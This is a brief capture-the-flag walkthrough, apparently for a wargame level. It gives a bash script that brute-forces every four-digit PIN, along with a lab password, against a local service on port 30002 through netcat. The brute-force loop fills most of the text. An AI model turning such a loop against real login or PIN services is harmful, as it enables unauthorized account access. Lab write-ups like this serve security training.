This one is pretty straightforward. We need to guess a four digit pin and send it to a server on port 30002. To generate all the possible 4 digit combinations and send them to the server we will need to write a shell script and pipe the output to netcat.

.../bruteforce
'''
#! /bin/bash

PASS="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

for T in {0..9};do
  for H in {0..9};do
    for t in {0..9};do
      for O in {0..9};do
        PIN="$T$H$t$O"
        echo "$PASS $PIN"
      done;
    done;
  done;
done

.../bruteforce | nc localhost 30002
